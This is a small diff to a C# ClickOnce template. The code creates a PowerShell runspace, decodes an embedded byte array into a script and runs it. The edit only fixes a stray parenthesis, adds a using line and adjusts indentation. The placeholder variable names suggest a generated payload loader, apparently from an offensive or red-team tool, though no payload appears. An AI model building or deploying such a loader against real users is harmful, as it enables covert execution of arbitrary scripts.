@@ -9,6 +9,7 @@ using System.Runtime.InteropServices;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Threading;
+using System.Diagnostics;
 
 namespace ClickOnceTemplate
 {
@@ -41,8 +42,8 @@ namespace ClickOnceTemplate
               
               RunspaceInvoke VAR5 = new RunspaceInvoke(VAR4);
               Pipeline VAR12 = VAR4.CreatePipeline();            
-              VAR12.Commands.AddScript((Encoding.UTF8.GetString(VAR11));
-							VAR12.Commands.Add("Out-String");
+              VAR12.Commands.AddScript(Encoding.UTF8.GetString(VAR11));
+	      VAR12.Commands.Add("Out-String");
               Collection<PSObject> VAR13 = VAR12.Invoke();
               VAR4.Close();
             }
